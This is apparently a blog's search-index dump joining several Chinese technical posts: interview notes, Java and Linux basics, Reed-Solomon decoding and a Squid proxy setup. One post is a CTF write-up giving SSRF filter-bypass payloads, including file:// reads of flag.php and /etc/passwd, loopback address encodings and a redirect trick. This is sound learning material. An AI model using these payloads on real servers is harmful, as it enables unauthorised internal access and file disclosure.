GPT：ESP（栈指针）指向当前栈顶，EBP（基址指针）通常指向当前栈帧的起始位置。在函数调用时，调用者会把当前的 EBP 压栈保存，随后 ESP 的值赋给 EBP，形成新的栈帧，ESP 指向新栈帧的栈顶。函数返回时，通过恢复 EBP 和 ESP 的值来返回到调用者的栈帧。 请解释 RSA 算法的基本原理，并描述一种常见的 RSA 攻击方式。 RSA 的安全假设是基于大整数分解的困难性，原理基于欧拉定理；常见攻击方式有部分私钥泄露攻击，Coppersmith 即可恢复私钥。 GPT：RSA 算法基于大整数分解的困难性。它使用两个大质数的乘积作为公钥，公钥加密消息后只能用对应的私钥解密。常见的 RSA 攻击方式包括基于部分私钥泄露的攻击，例如 Coppersmith 攻击，这种攻击可以在已知部分私钥的情况下恢复完整私钥。 如何实现一个安全的随机数生成器？请讨论常见的伪随机数生成器的安全性问题。 使其达到 m-序列；常见伪随机数生成器均为线性，已经一部分序列容易恢复全部序列。 GPT：安全的随机数生成器通常基于硬件随机数生成器或密码学安全算法，如 CryptGenRandom（Windows）或 /dev/random（Linux）。常见的伪随机数生成器（PRNG）如 rand() 基于线性同余生成器，安全性较差，容易预测，安全性不高。密码学安全的 PRNG（CSPRNG）如 openssl 提供的随机数生成器使用复杂的算法确保不可预测性。 请描述如何使用 IDA Pro 进行静态分析，并解释其在逆向工程中的作用。 IDA 的插件可以直接生成 C 的伪代码，可以对其伪代码进行逆向分析。 GPT：IDA Pro 是一款强大的反汇编工具，用于将二进制代码转换为可读的汇编代码或伪代码。它可以通过插件生成 C 的伪代码，便于理解程序逻辑。在逆向工程中，IDA Pro 通过静态分析帮助分析二进制文件的结构、函数调用关系和代码流程，从而理解和修改程序。 请举例说明如何利用 GDB 进行动态调试，以及在调试过程中常见的陷阱和解决方法。 不会。 GDB 是 GNU 的调试器，用于调试 C 和 C++ 程序。常见的使用方法包括： 1gdb ./program 启动程序并设置断点： 12break mainrun 查看变量值： 1print variable 单步执行： 12nextstep 常见陷阱包括多线程调试时难以同步线程、优化编译后的代码难以调试等。解决方法是使用 GDB 提供的线程命令和编译时关闭优化选项。 什么是栈溢出漏洞？请解释如何通过 ROPgadget 工具进行 ROP（返回导向编程）攻击。 栈溢出漏洞是指变量在栈上空间分配不足，写入数据越过了变量的栈空间覆盖到其他数据，常见覆盖返回地址，从而劫持程序流；ROPgadget 可以查找程序中存在的 pop 和 ret 指令，通过这些指令可以劫持流。 GPT：栈溢出漏洞是指程序将数据写入栈时超过预期长度，覆盖了其他数据，尤其是返回地址，从而劫持程序流。ROPgadget 工具用于查找程序中现有的 pop 和 ret 指令，通过这些指令片段（gadget）链式组合，实现复杂的恶意行为而不需要插入新代码，从而绕过不可执行栈保护（NX bit）。 请描述堆溢出漏洞的原理，并举例说明如何利用该漏洞进行攻击。 不会。 GPT：堆溢出漏洞是指程序在堆上分配内存时超过了分配的边界，覆盖了其他内存区域。攻击者可以利用该漏洞修改程序控制数据或函数指针，导致执行任意代码。示例攻击包括利用堆溢出修改函数指针，使其指向恶意代码，从而执行任意命令。 请解释如何使用 Burp Suite 进行 Web 应用程序的漏洞扫描。 一般不使用 BP 扫漏洞。 Burp Suite 是一款用于 Web 安全测试的综合工具。其漏洞扫描器模块可以自动发现常见的 Web 应用漏洞，如 SQL 注入、跨站脚本（XSS）等。使用方法包括设置代理拦截 HTTP 流量，进行主动或被动扫描，分析结果并生成报告。 在渗透测试中，如何使用 Nmap 进行网络探测？请解释常用的 Nmap 扫描类型及其用途。 一般加参数 -F 扫常见端口，再 -p- 全端口扫描，-sS 查看端口上运行的服务详情。 GPT：Nmap 是一款网络扫描工具，用于发现网络上的设备和服务。常用扫描类型包括： -sS（SYN 扫描）：快速隐蔽扫描，适用于发现开放端口。 -sT（TCP 连接扫描）：完全连接扫描，适用于详细服务信息获取。 -sU（UDP 扫描）：扫描 UDP 端口，发现 UDP 服务。 -O（操作系统检测）：识别远程主机的操作系统。 请描述你在 Linux 系统中常用的系统管理命令及其功能。 ls 查看目录下文件，nano 编辑文件，df 查看磁盘，pwd 当前目录。 GPT:常用的 Linux 系统管理命令包括： ls：列出目录内容。 nano：轻量级文本编辑器。 df：显示文件系统的磁盘空间使用情况。 pwd：打印当前工作目录。 在 Linux 环境下，如何设置并管理一个 Nginx 服务器？ 设置在 nginx.conf 里；不太会。 GPT：设置和管理 Nginx 服务器包括编辑配置文件 nginx.conf，设置服务器块（server blocks）定义虚拟主机，配置反向代理、负载均衡和 SSL。启动、停止和重启 Nginx 服务器使用以下命令： 123sudo systemctl start nginxsudo systemctl stop nginxsudo systemctl restart nginx 请解释 GitHub Actions 的工作原理，并描述如何通过 GitHub Actions 实现 CI/CD。 通过 .workflow 下设定的工作流实现自动化，可以指定环境，编译代码和发布版本。 GPT：GitHub Actions 通过 .github/workflows 目录下定义的 YAML 文件配置工作流。每个工作流由触发器、作业和步骤组成。通过配置触发器（如 push 或 pull_request），指定在特定事件发生时自动执行作业，实现代码的持续集成（CI）和持续部署（CD）。 在使用 Docker 时，如何创建并管理一个多容器应用？请说明 docker-compose 的基本用法。 多个容器之间一般会有启动先后的顺序，比如数据库先启动，web 服务后启动，此时通过 depends_on 标签控制，持久化部署也需要进行目录映射。 Docker Compose 用于定义和管理多容器 Docker 应用。使用 docker-compose.yml 文件定义服务、网络和卷。示例： 123456789101112version: '3'services:db: image: mysql environment: MYSQL_ROOT_PASSWORD: exampleweb: image: nginx depends_on: - db ports: - &quot;80:80&quot; 启动多容器应用： 1docker-compose up 可以看出 GPT 给的答案还是受了我的影响","link":"/2024/06/02/GPT%20%E9%9D%A2%E8%AF%95%E5%AE%98/"},{"title":"Java 基础概念","text":"捋一下 Java 是怎么个事 前言想复现一下关于 Log4j 的近古漏洞 CVE-2021-44228，并接触一下 Java 反序列化，但是哥们一直没写过 Java，所以还是先了解一下这门语言先吧。 JRE JDK JVMJRE 全称 Java Runtime Environment，Java 运行环境。它是 Java 的运行时环境，包含了 Java 虚拟机（JVM）和 Java 核心类库。JRE 是运行 Java 程序的必要条件，但不包含开发工具。JDK 全称 Java Development Kit，Java 开发工具包。它是 Java 的开发环境，包含了 JRE 和一些开发工具，如编译器（javac）、调试器（jdb）等。JDK 是开发 Java 程序的必要条件。JVM 全称 Java Virtual Machine，Java 虚拟机，负责执行 Java 字节码。JVM 是 JRE 的一部分，是 Java 程序运行的核心组件。 也就是说，JDK = JRE + 开发/调试工具，JRE = JVM + 核心类库。 Java 版本如果说还有一个令人迷惑的东西，那就是 Java 的版本了，其版本命名十分怪异，与 Python 之类规律版本命名方式完全不同。光是平时就看见 Java8 和 Java22 之类的了。 Java 有三个主要版本： Java SE（Standard Edition）：标准版，适用于桌面和服务器应用程序。 Java EE（Enterprise Edition）：企业版，适用于大型企业级应用程序。 Java ME（Micro Edition）：微型版，适用于嵌入式和移动设备。 而我们平时只需要关注 Java SE 就可以了。然后提到 JDK，有一个简单的对应关系：一个 Java 版本对应一个 JDK 版本。 发展历程最古早的时候，也就是 1996 年，Java 1.0 发布了，同时对应着 JDK 1.0。那按道理来说下面就是 Java 1.1 和 JDK 1.1，然后是 Java 1.2 和 JDK 1.2，然后一直这样。哎，他不98 年，Java 1.1 的下一个版本变成了 J2SE 1.2，JDK 倒是一保持命名，也是 JDK 1.2。然后到 04 年的时候，原本版本号应该是 J2SE 1.5，但是由于 Java 版本又有一个大便化，哎，改成了 Java SE 5.0，JDK 命令依旧不变，还是 JDK 1.5。 这时候你觉得 JDK 命名还挺稳定的然而我们把时间拉到 2018 年，Java SE 10 发布，JDK 不叫 JDK 1.10 了，叫 JDK 10。这种命名也一直延续至今，我写这篇文章的时候已经是 Java SE 24，这个版本也会在今年（2025 年）9 月停止更新，届时会发布一个 LTS（Long Term Support，即长期支持）版本 —— Java SE 25。 有几个 LTS 版本，分别是 8、11、17 和 21。 参考What is the difference between JDK and JRE?一文彻底搞懂令人疑惑的Java和JDK的版本命名！","link":"/2025/04/09/Java%20%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5/"},{"title":"Linux 学习笔记","text":"最近用到 Linux 挺多，整理一下。 终端美化一个好看的终端确实是第一生产力 123456789# 安装 oh-my-poshsudo wget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/posh-linux-amd64 -O /usr/local/bin/oh-my-poshsudo chmod +x /usr/local/bin/oh-my-posh# 下载主题mkdir ~/.poshthemeswget https://github.com/JanDeDobbeleer/oh-my-posh/releases/latest/download/themes.zip -O ~/.poshthemes/themes.zipunzip ~/.poshthemes/themes.zip -d ~/.poshthemeschmod u+rw ~/.poshthemes/*.omp.*rm ~/.poshthemes/themes.zip oh-my-posh get shell 看看 shell，一般是 bash 的情况下，就在 ~/.bashrc（也可能是 ~/.profile 或 ~/.bash_profile）文件追加一行 1eval &quot;$(oh-my-posh init bash --config ~/.poshthemes/.kali.omp.json))&quot; # kali为主题名称，可以自己更换其他的 说起来这个 kali 主题还是 GZTime 学长提的 pr ，当时他还打成了 kail 来着（笑然后执行以下命令重载配置文件： 1exec bash oh-my-posh 官方文档：https://ohmyposh.dev/docs/ 换源CentOS 默认已经调好阿里源了，就不用换了，以下是 apt 换中大源的方法： 1sudo vim /etc/apt/sources.list 按 i 切换到编辑模式，然后全删了，写入 deb https://mirrors.matrix.moe/kali kali-rolling main non-free contrib，Esc 键退出编辑模式，:wq 保存退出。 更新软件源列表： 1sudo apt update ssh配置想起我闲置的阿里服务器，又折腾了好久。首先新建用户： adduser &lt;用户名&gt; 并设置好密码（网上说 CentOS 下的 adduser 和 useradd 是一样的，但我用的时候他也给我一整套配下来了，home 下也有文件夹。） 1234567su &lt;用户名&gt;ssh-keygen -t rsa #生成密钥对，一路回车就行cd ~/.sshcat id_rsa.pub &gt;&gt; authorized_keys #把密钥添加到authorized_keys文件中chmod 600 authorized_keyschmod 700 ~/.ssh #权限700的时候，sshd才能读到service sshd restart #重启sshd服务 权限说明一般用三个数字表明文件的权限，第一个数字表示用户，第二个数字表示组，第三个数字表示公共。 4 表示可读， 2 表示可写， 1 表示可执行，加一起就是全部权限。比如 755 表示用户可读，可写，可执行，组可读，可执行，公共可读，可执行。 可能你会问 222 权限啥意思，难道还能只写不读？其实还真是这样，笔者试过可以 cat &gt;&gt; file 进行追加写入，但不能读取文件内容。 遇到文件执行不了的情况，试试 chmod +x [file] ，就有执行权限了。 编辑器（vim）虽然有 VSCode 的存在，但有时候由于 ssh 的用户权限不够等原因不可避免地要用到 vim （当然硬要避免也有在其他地方写好再 cp 过去等诡方法，但总是麻烦着点）vim 的三个模式：命令模式（ Command mode ），输入模式（ Insert mode ）和底线命令模式（ Last line mode ）一般就按 i 进入编辑模式， Esc 退出编辑模式并 :wq 保存退出。在查看模式下，可以 h 左移， j 下移， k 上移， l 右移，按 / 可以搜索。 常用命令 命令行 without 鼠标确实爽。 chown即 change owner ，用于改变文件的所有者。 一般 chown [user] [file] ，如果是目录还要加上 -R 参数，意为改变目录下所有文件的所有者。 ln即 link ，用于创建符号链接，和 Windows 的快捷方式类似。 一般 ln -s [old] [new] ，就是创建一个符号链接，把 old 文件的内容链接到 new 文件，如果后面不加 [new] 参数，那么就会默认创建到当前目录下。 ps即 process status ，用于查看进程状态。 一般加 -aux 显示所有包含其他使用者的进程。不过这只是一个快照，如果想看动态的，就用 top 命令。 top没啥缩写了，就是 top ，用于实时显示进程的状态。 grep12grep &quot;pattern&quot; filename # 在文件中查找 pattern 字符串grep -r &quot;pattern&quot; directory # 在目录中递归查找 pattern 字符串 du1du -h --max-depth=1 | sort -h # 查看当前目录下各文件夹大小 参考https://www.lxlinux.net/1431.html菜鸟教程https://blog.csdn.net/KevinChen2019/article/details/119697489https://blog.csdn.net/lucky__peng/article/details/124268817https://blog.csdn.net/liuxiao723846/article/details/125042549","link":"/2022/07/07/Linux%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"title":"Matrix 面试 - 前端篇","text":"持续懵逼 Promise 所有为你而行的空幻梦想，都不及最后与你许的愿望。——《梦回还》 异步编程JS 有个很重要的部分叫异步编程，那么所以谓异步，大概可以通过这样一个例子说明： 一个网页，有文字，有图片，假定按照同步的方式来加载，那么就要等图片下载完了再加载内容，而如此一来，用户看到的就是一个空白了很久的网页突然弹出一堆东西，关键不在突然弹出，而在出现内容前的空白时间，用户一不耐烦给你关了，再花的网页都无用了（）。那么就有一个解决方法，先把文字渲染上去，然后等图片传输完成再渲染图片，这样就有一种 99% 的感觉，用户就没那么容易跑了。这就是异步的思想。 回调回调是一种早期的异步编程方式，但是由于其嵌套造成的“回调地狱”，现在基本已经不再使用，就不再赘述了。 期约一个简单的 Promise 实例： 123456789let p=new Promise((resolve, reject) =&gt;{ setTimeout(()=&gt;{ resolve('2'); },2000);})console.log('1');p.then((data)=&gt;{ console.log(data);}) 这段代码中定义了一个 Promise 对象 p，这个对象中的 setTimeout 会在 2 秒后调用 resolve 方法，resolve 方法一调用， p.then 就会执行，data 接的是 resolve() 传入的参数，这里是 ‘2’ 。 async / await待更新… xss注入XSS，也就是 Cross-Site Scripting 的缩写，意为跨站脚本。具体来说就是把恶意代码注入到网页中，用户一打开网页，恶意代码就执行了。常见的 XSS 漏洞类型有如下几种： 反射/存储型 XSS DOM 操作型 XSS 反射 / 存储型 XSS反射型XSS通常是指恶意代码未被服务器存储，每次触发漏洞的时候都将恶意代码通过 GET/POST 方式提交，然后触发漏洞。 csrf 攻击最近打 CTF 见着一个叫 ssrf 攻击的，这俩长挺像，就想着是不是一个 Client 一个 Server ，再一搜，发现还真。。。不是。csrf 全称 Cross-site request forgery ，意为跨站请求伪造，而 ssrf 全称 Server-side request forgery ，意为服务器端请求伪造。 原生 JS 数据绑定和反射待更新… CSS 盒模型看吧，就是像个盒子（逃（图源菜鸟教程）Margin 指外边距，Border 指边框，Padding 指内边距，Content 指内容。然后没啥好解释了，实际上就是反复调整这几个部分的宽高，而且功夫不到家（像我这样）很容易被坑到，因为两个盒子之间可能会存在重叠。 行内元素和块级元素表面上说比较突出的特点就是块级元素单独占一行或者几行，而行内元素不占独立区域。 块级元素块级元素一般有下面几种： 123456&lt;h1&gt;~&lt;h6&gt;&lt;p&gt;&lt;div&gt;&lt;ul&gt;&lt;ol&gt;&lt;li&gt; 块级元素的宽度默认是容器的 100% ，也就是说它的宽度和父元素的宽度一样。里面也可以塞进行内元素和其他块级元素。 行内元素行内元素又名内联元素，一般有下面几种： 12345678&lt;a&gt;&lt;span&gt;&lt;b&gt;&lt;i&gt;&lt;em&gt;&lt;strong&gt;&lt;small&gt;&lt;del&gt; 行内元素和相邻行内元素是在同一行上的，而且有个关键的特点——它是不能调宽高的，默认宽高就是内容的宽高。但也不是完全定死，水平方向的 padding 和 margin 就是可调的。行内元素里面只能放纯文本或者其他行内元素，而不能放块级元素。 行内块级元素有这个玩意也是我始料未及的所谓行内块级元素，本质也是行内元素，但不同的是它具有块级元素可调高度的特性，而且和相邻的行内元素在同一行的时候，中间会有空白间隙。行内块级元素一般有下面几种： 123&lt;img/&gt;&lt;input/&gt;&lt;td/&gt; 持续更新中… 参考 《JavaScript高级程序设计》（第4版）——Matt Frisbie[著]李松峰[译] 《从0到1：CTFer成长之路》——Nu1L战队[著] https://blog.csdn.net/qingyafan/article/details/52203663 https://www.runoob.com/css/css-boxmodel.htmlhttps://blog.csdn.net/qq_34821198/article/details/91359274","link":"/2022/04/03/Matrix%20%E9%9D%A2%E8%AF%95%20-%20%E5%89%8D%E7%AB%AF%E7%AF%87/"},{"title":"Matrix 面试 - Summary","text":"吃一堑，长一智。 第一次正经面试，虽然简历已经填得很谨慎，但是面试官还是没有放过我，从铜锣湾问到上海滩，而我：不清楚，没了解过，没听说过，忘了，不会。（安详） 痛定思痛，在按照学长的指引看书的同时，我也对提的问题作了总结，主要分为三个部分：算法、计算机网络、前端。 算法问了动态规划，计算机网络问了路由转发、https、DNS 和 CDN，这俩内容较少，并作一篇和其他杂项一起总结。前端问了 Promise、xss 注入、csrf 攻击、原生 JS 数据绑定和反射、CSS 盒模型以及行内元素和块级元素。 内容有点多，不定期更新（逃","link":"/2022/04/03/Matrix%20%E9%9D%A2%E8%AF%95%20-%20Summary/"},{"title":"Matrix 面试 - 算法&amp;计网篇","text":"开局暴击 算法面试官给了我一道力扣上的动态规划题，虽然我之前浅浅看过，但没刷过题，一时确实做不出来，然后他换了一道标着“简单”的动规题———经典爬楼梯，still，我还是不会，甚至思路来到了传说中的——递归（逃 直到面试结束后我才一拍脑门，原来递规与动归的区别是前者从后向前推，而后者从前向后推！ 题目 假设你正在爬楼梯。需要 n 阶你才能到达楼顶。每次你可以爬 1 或 2 个台阶。你有多少种不同的方法可以爬到楼顶呢？ 分析不难看出，这题就是求一个斐波那契数列，即有$$ f(n) = f(n-1) + f(n-2)$$如果用递归，那么就是从 $f(n)$ 开始向前推，显然，这样的复杂度是 $O(2^n)$ 。但如果考虑动规，那么就是从 $f(1)$ 开始向后推，不难看出，此时复杂度就神奇般变成了—— $O(n)$ 。 计算机网络 前段时间由于众所周知的原因，学校把我们平时用的论坛屏蔽了，具体表现在用校园网打不开论坛的网页。后来发现是内网 DNS 搞的鬼，也就兴致勃勃地研究起计算机网络来，上课摸鱼的时候粗略看了一下网络层与网络互连的内容，然后写简历的时候就作死住上填了个“计网初步”，再然后——我就寄了。（安详）——引子 问：同一个子网一台主机向另一台主机发送数据，这个数据是否会直接被转发到另一台主机？ 七层网络模型，从底到顶分别是：物理层，数据链路层，网络层，传输层，会话层，表示层，应用层（现在好像简化成四层来着），总之这个问题大概归到网络层和数据链路层的。然后呢，答案就是，我不知道！其实呢，我一开始以为自己知道了，但越看越不知道了，最后可能得把整个计网翻上一遍才能彻底整明白了。（没错这就是传说中的递归学习） 下面简单介绍几个概念，要理解这个问题就逃不开。 物理地址首先有一件事就是，IP 地址是逻辑网络上的东西，数据链路层是不能直接用的，就好像你要寄信给小 X 家，地址总不能直接填个“小 X 家”。而详细地址，在计网中叫物理地址，才是物理网络所认的标识。 ARP现在我们有了 IP 地址，就需要用ARP 协议(Address Resolution Protocol)来找到对应的物理地址。两者并非是简单的映射关系，而且也会动态变化，就像小 X 搬个家，那里就不叫小 X 家了，过一会搬个小 Y 来，又成了小 Y 家。 ARP cache为了解决这个问题，主机里就设置了个 ARP 高速缓存，即 ARP cache，上面存着本局域网上各主机和路由器的 IP 地址和物理地址的映射表。主机 A 向本局域网中的另一台主机 B 发送 IP 数据报时，就先看看里面有没有主机 B 的记录，有的话就好办了，把主机 B 的物理地址写入 MAC 帧里，然后丢进通信链路里就完事。But 事情总不可能这么简单，有相当大的概率表上是没有主机 B 的，这时主机 A 就会在所在局域网上广播一个 ARP 请求分组，这个广播可以类似生活中广播的概念，可以做到无差别攻击，就是局域网上的所有主机都会收到。这个 ARP 请求分组上有主机 A 的 IP 地址和物理地址，也有主机 B 的 IP 地址，主机 B ，说这不是我嘛，当即发一个单播回去，很快啊，上面有主机 B 的 IP 地址和物理地址。注意到，由于已经收到包含主机 A 物理地址的 ARP 请求分组，所以主机 B 能精准投递到主机 A ，而不用再广播了。显然这时双方都知道对方的物理地址，就写进各自的 ARP cache 中，以后通信就能直接扔过去了。至此，问题已经逐渐明朗，但有一个关键点，以上的讨论都是基于同一个局域网，而局域网和子网并无直接联系。 局域网这个概念非常广泛，一般来讲就是指一个小范围的网络，但这样事情就解释不通了，两台网线都不接的主机放在一起算不算同在一个局域网？说不清。所以较真点讲局域网指的是VLAN（Virtual LAN），即虚拟局域网，虚拟局域网 待更新… 参考https://blog.csdn.net/jeffleo/article/details/54174835","link":"/2022/04/03/Matrix%20%E9%9D%A2%E8%AF%95%20-%20%E7%AE%97%E6%B3%95&%E8%AE%A1%E7%BD%91%E7%AF%87/"},{"title":"SSRF &amp; CSRF","text":"朝花夕拾。 前言遥远的三年前就被 Matrix 面试问过 CSRF，如今子弹正中眉心了。 SSRFSSRF 简介SSRF（Server-Side Request Forgery）中文翻译过来就是服务器端请求伪造攻击。 以下为 CTFShow 上的题目： web351 - web355题目 web351 直接访问代码如下： 1234567891011&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);?&gt; 再测试一下目录，发现存在 /flag.php 文件，访问提示 非本地用户禁止访问，说明题目意思就是利用 index.php 来构造 SSRF 攻击访问 /flag.php。搜索发现 curl_exec() 函数可以使用 file:// 协议来读取本地文件，直接构造请求： 1curl -X POST -d &quot;url=file:/var/www/html/flag.php&quot; http://f9eb43c2-526b-4868-9513-ec378c84383c.challenge.ctf.show/ 即可查看到 /flag.php 的内容，同样也能读取 /etc/passwd 等文件。 web352 直接访问代码如下： 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if($x['scheme']==='http'||$x['scheme']==='https'){if(!preg_match('/localhost|127.0.0/')){$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);}else{ die('hacker');}}else{ die('hacker');}?&gt; 题目意思框定了要求的协议为 http 和 https，并且不能包含 localhost 和 127.0.0，但是仔细观察可以发现 preg_match() 函数只有 pattern 参数，根本没有起到检测的作用，直接传 http://127.0.0.1/flag.php 也能访问到 /flag.php 的内容，预期解应该是传长整数型的 IP，即 http://2130706433/flag.php，当然直接传 0x7f000001 也是没有问题的。 web353 直接访问代码如下： 12345678910111213141516171819202122&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if($x['scheme']==='http'||$x['scheme']==='https'){if(!preg_match('/localhost|127\\.0\\.|\\。/i', $url)){$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);}else{ die('hacker');}}else{ die('hacker');}?&gt; 。。。直接就是上一题的 revenge，但是聪明的出题人你知不知道回送地址是 127.0.0.0/8 呢我直接一个 127.2.0.1 你不炸了吗 web354 做得比较绝了，直接 preg_match('/localhost|1|0|。/i', $url)，我想一会直接搞了个比较淫荡的方法，经过测试这个环境是通网的，那直接用手头的域名解析到 127.0.0.1 即可，http://local.weyung.cc/flag.php 就行了，最后一看 wp 好像这还确实是预期解，绷。 web 356 直接访问代码如下： 1234567891011121314151617181920212223&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if($x['scheme']==='http'||$x['scheme']==='https'){$host=$x['host'];if((strlen($host)&lt;=5)){$ch=curl_init($url);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$result=curl_exec($ch);curl_close($ch);echo ($result);}else{ die('hacker');}}else{ die('hacker');}?&gt; 把 host 长度限制在 5 个字符以内，想不出来了，看 wp 的话可以 http://0/flag.php，因为在 Linux 中 0 指向 localhost，也可以 http://127.1/flag.php，当然我觉得有钱买个更短的域名应该也行就是了（ web356 - web360web356 直接就是把长度限制调成 3 了，应该就是只能用 http://0/flag.php 了。 web357 直接访问代码如下： 12345678910111213141516171819&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if($x['scheme']==='http'||$x['scheme']==='https'){$ip = gethostbyname($x['host']);echo '&lt;/br&gt;'.$ip.'&lt;/br&gt;';if(!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) { die('ip!');}echo file_get_contents($_POST['url']);}else{ die('scheme');}?&gt; 这个过滤也做得比较绝，直接把本地 IP 都封死了，只能在公网服务器做一个 302 重定向 1&lt;?php header(&quot;Location: http://127.0.0.1/flag.php&quot;, true, 302);?&gt; 然后访问这个公网 IP 即可。 web358 直接访问代码如下： 12345678&lt;?phperror_reporting(0);highlight_file(__FILE__);$url=$_POST['url'];$x=parse_url($url);if(preg_match('/^http:\\/\\/ctf\\..*show$/i',$url)){ echo file_get_contents($url);} 这个除了搞一个 ctf 开头的域名以外我也想不出来方法了，看 wp 可以构造 http://ctf.@127.0.0.1/flag.php?show 这样的 payload，直接把 ctf. 作为 username 传入。 web359 开始就是正经题目了，访问得到一个登录页面 // To be continued… CSRFCSRF（Cross-Site Request Forgery）中文翻译过来就是跨站请求伪造攻击。我一度分不清 CSRF 和 XSS 的区别，大致区别就是 XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。 参考https://xz.aliyun.com/news/10663https://blog.csdn.net/qq_43378996/article/details/123910614https://en.wikipedia.org/wiki/Cross-site_request_forgery","link":"/2025/04/03/SSRF%20&%20CSRF/"},{"title":"Reed-Solomon 纠错码","text":"终于有时间整理一下了，爆破毕竟还是太粗鲁了。 羊城杯的一道题，题目中只破坏了消息的随机两个位置，消息又在 256 以内，所以可以直接暴力枚举。下面探寻优雅点的解法。 编码先来看看题目的代码，如下是编码的核心函数： 1234567891011121314m = 257F = Zmod(m)alpha = F(223)PR.&lt;x&gt; = PolynomialRing(F)gx = (x - alpha ^ 0) * (x - alpha ^ 1) * (x - alpha ^ 2) * (x - alpha ^ 3)def encode_block(message): assert isinstance(message, list) f = PR([0] * 4 + message) px = f % gx mx = f - px c = [_ for _ in mx] return c + (8 - len(c)) * [0] 分析一下，代码中取一个生成多项式 $g(x)=(x-\\alpha^0)(x-\\alpha^1)(x-\\alpha^2)(x-\\alpha^3)$ ，然后将消息多项式 $M(x)$ 模 $g(x)$ ，得到余数多项式 $P(x)$ ，最后得到编码后的消息 $S(x)=M(x)-P(x)$ 。这时有 $S(x)\\equiv 0\\mod g(x)$ 。这里解释一下各个参数，当时我也是看了好久 sagemath 的文档也没搞懂。生成多项式 $g(x)=\\prod\\limits_{j=1}^{n-k}(x-\\alpha^j)$// TODO 解码照着这篇文章搓了个 PGZ 解码器，代码如下： 1234567891011121314151617181920212223242526def decode_block(r_x): S = [PR(r_x)(alpha^i) for i in range(4)] nu = 2 A = matrix(F,nu,nu) for i in range(nu): for j in range(nu): A[i,j] = S[i+j] b = vector(F,[-S[nu+i] for i in range(nu)]) x = list(A.solve_right(b)) x.append(1) x.reverse() Lambda = PR(x) I = [] for i in range(8): if Lambda(alpha^(-i))==0: I.append(i) I = I + [0] * (2 - len(I)) X = [alpha^I[i] for i in range(2)] A = matrix(F,2,2) for i in range(2): for j in range(2): A[i,j] = X[j]^i b = list(A.solve_right(vector(F,S[:2]))) for i in range(len(I)): r_x[I[i]] -= b[i] return r_x[4:] 参考 https://zhuanlan.zhihu.com/p/104306038 https://eprint.iacr.org/2017/733.pdf","link":"/2022/09/17/Reed-Solomon%20%E7%BA%A0%E9%94%99%E7%A0%81/"},{"title":"Squid 代理简记","text":"ChatGPT 确实是好东西 前言之前一直用的 ChatGPT 的号还是当时淘宝买的，还充了 Plus，但是不能改密码，有点强迫症，就想自己开个号。现在 ChatGPT 的号注册越来越麻烦了，万人骑的机场的 IP 已经被 ban 干净了，前几天就拜托一个新加坡的学长帮忙用自己邮箱的号开了个号，后继又想再帮同学开几个，但总不好一直叨扰学长，就想自己搭个梯子。 服务器问一个微软学生大使的同学在 Azure 开了台美国的机子（学生邮箱也可以白嫖），但是 SSH 老是连不上，一试发现是校园网的问题，用我阿里云的服务器去 SSH 就能稳定连上，再不久也发现原来我机场梯子老掉也是校园网的缘故，用阿里云的机子走机场稳定秒开 Google，当时我就气炸了。最终的方案是用阿里云的机子当跳板机去 SSH 美国的机子，./ssh/config 配置如下 12345Host &lt;你想叫啥就叫啥&gt; HostName &lt;x.x.x.x&gt; User &lt;user&gt; IdentityFile &lt;~/.ssh/US.pem&gt; ProxyCommand ssh -W %h:%p &lt;aliyun&gt; &lt;&gt; 里的内容自行替换。 SquidSquid 这个东西是 ChatGPT 推荐的，可以直接在机子开个 http 代理，简单方便。安装也是直接 sudo apt install squid 就行，然后把 /etc/squid/squid.conf 改成如下（不会用 vim 可以用 nano）： 123456789101112131415161718192021222324252627282930313233# ACLs all, manager, localhost, and to_localhost are predefined.acl SSL_ports port 443acl Safe_ports port 80 # httpacl Safe_ports port 21 # ftpacl Safe_ports port 443 # httpsacl Safe_ports port 70 # gopheracl Safe_ports port 210 # waisacl Safe_ports port 1025-65535 # unregistered portsacl Safe_ports port 280 # http-mgmtacl Safe_ports port 488 # gss-httpacl Safe_ports port 591 # filemakeracl Safe_ports port 777 # multiling httpacl CONNECT method CONNECT# 拒绝所有非 Safe_ports 的请求http_access deny !Safe_ports# 拒绝所有非 SSL_prots 的 CONNECT请求http_access deny CONNECT !SSL_ports# 允许来自本地的请求http_access allow localhost# 拒绝所有请求，最后兜底的规则http_access deny all# 端口设为 3128http_port 3128# 高匿代理配置request_header_access Via deny allrequest_header_access X-Forwarded-For deny allrequest_header_access From deny all 然后 sudo systemctl restart squid，要等上一会，我应该等了差不多半分钟。 然后我端口转发搞了一天，失败得莫名其妙的，最终就直接用 VSCode SSH 后自带的端口转发顶着先了。 更新：后来用 SSH 的端口转发了，命令如下： 1ssh -N -L 0.0.0.0:55555:localhost:3128 &lt;your-azure&gt; 这样就可以在本地的 55555 端口访问到远程的 3128 端口了，0.0.0.0 是想给同一局域网的其他机子接，不需要的话可以只写端口，-N 意思是不启动远程 shell，如果你希望在后台运行可以再加个 -f。但是这样不够优雅，就再搞了个 systemd 的服务，配置如下： 123456789101112# /etc/systemd/system/ssh-tunnel.service[Unit]Description=SSH tunnel serviceAfter=network.target[Service]ExecStart=/usr/bin/ssh ssh -N -L 0.0.0.0:55555:localhost:3128 